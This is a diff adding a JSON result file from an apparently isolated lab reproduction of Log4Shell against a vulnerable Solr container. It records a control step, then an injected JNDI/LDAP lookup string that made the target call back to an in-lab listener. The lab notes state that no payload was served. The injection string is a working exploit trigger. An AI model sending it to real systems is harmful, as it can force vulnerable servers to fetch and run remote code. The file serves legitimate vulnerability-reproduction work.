@@ -1,0 +1,45 @@
+{
+  "chain": "log4shell-solr",
+  "run_at": "2026-11-14T22:52:28.346406+00:00",
+  "steps": [
+    {
+      "step": "benign",
+      "observed": "sent",
+      "callbacks": 0,
+      "expected": "no callback",
+      "ok": true
+    },
+    {
+      "step": "log4shell_jndi",
+      "injection": "${jndi:ldap://listener:1389/sol}",
+      "observed": "sent-with-status=HTTPError",
+      "new_callbacks": [
+        {
+          "event": "callback",
+          "peer_ip": "172.26.0.2",
+          "peer_port": 59840,
+          "first_bytes_hex": "300c020101600702010304008000",
+          "ts": "2026-11-14T22:52:49.796004+00:00"
+        },
+        {
+          "event": "callback",
+          "peer_ip": "172.26.0.2",
+          "peer_port": 59852,
+          "first_bytes_hex": "300c020101600702010304008000",
+          "ts": "2026-11-14T22:52:49.798125+00:00"
+        }
+      ],
+      "expected": "one LDAP callback from solr",
+      "ok": true
+    }
+  ],
+  "status": "PASS",
+  "fidelity": {
+    "reproduced": [
+      "B2 real Log4Shell JNDI/LDAP callback"
+    ],
+    "real_target": "vulhub/solr:8.11.0 with real Log4j 2.14.1 (CVE-2021-44228)",
+    "observable": "in-lab listener recorded an LDAP connection from the Solr container; listener returned no payload, so no class was loaded/executed.",
+    "safety": "isolation guard confirmed host+internet unreachable before deploy; internal network only."
+  }
+}
